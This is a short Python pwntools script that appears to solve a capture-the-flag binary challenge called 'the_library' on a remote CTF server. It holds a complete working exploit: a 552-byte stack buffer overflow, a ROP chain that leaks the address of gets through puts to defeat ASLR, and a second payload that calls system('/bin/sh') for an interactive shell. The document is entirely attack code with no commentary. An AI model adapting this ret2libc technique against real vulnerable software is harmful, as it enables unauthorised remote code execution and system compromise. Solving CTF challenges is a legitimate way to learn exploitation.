from pwn import *

overwrite = b"A"*552

libc = ELF("libc-2.31.so")

ret = p64(0x000000000040101a)
poprdi = p64(0x0000000000401493)
gets_at_got = p64(0x00403fc8)
puts_at_plt = p64(0x004010e0)
safe_point_main = p64(0x004012a9)
# gets_offset = p64(0x0000000000086af0)

payload = overwrite + poprdi + gets_at_got + puts_at_plt + safe_point_main

#p = process("./the_library")
p = remote("challenge.ctf.games", 31125)
p.recvuntil(b">")
p.sendline(payload)
p.recvline()
leak = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info(f"{hex(leak)=}")
libc_base = leak - libc.sym["gets"]
#print(hex(libc_base))

system = libc_base + libc.sym["system"]
bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))

payload_new = overwrite + ret + poprdi + p64(bin_sh) + p64(system)
p.sendline(payload_new)
p.interactive()
